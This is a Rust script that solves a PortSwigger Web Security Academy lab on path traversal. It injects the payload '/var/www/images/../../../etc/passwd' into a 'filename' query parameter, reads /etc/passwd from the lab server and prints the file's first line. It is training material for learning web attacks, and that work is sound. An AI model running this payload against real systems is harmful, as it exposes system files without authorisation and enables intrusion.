/****************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 11/10/2023
*
* Lab: File path traversal, validation of start of path
*
* Steps: 1. Inject payload into 'filename' query parameter to retrieve
*           the content of /etc/passwd
*        2. Extract the first line as a proof
*
*****************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0af700c204ec179f88f351f4009a00d2.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "⟪#⟫ Injection parameter:".blue(),
        "filename".yellow(),
    );
    print!(
        "{}",
        "⦗1⦘ Injecting payload to retrieve the content of /etc/passwd.. ".white()
    );
    io::stdout().flush();

    // the payload to retreive the content of /etc/passwd
    let payload = "/var/www/images/../../../etc/passwd";

    // fetch the page with the injected payload
    let injection = client
        .get(format!("{url}/image?filename={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    print!("{}", "⦗2⦘ Extracting the first line as a proof.. ".white(),);

    // get the body of the response
    let body = injection.text().unwrap();

    // extract the first line of /etc/passwd
    let first_line = capture_pattern("(.*)\n", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the first line of /etc/passwd".red()
    ));

    println!("{} => {}", "OK".green(), first_line.yellow());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
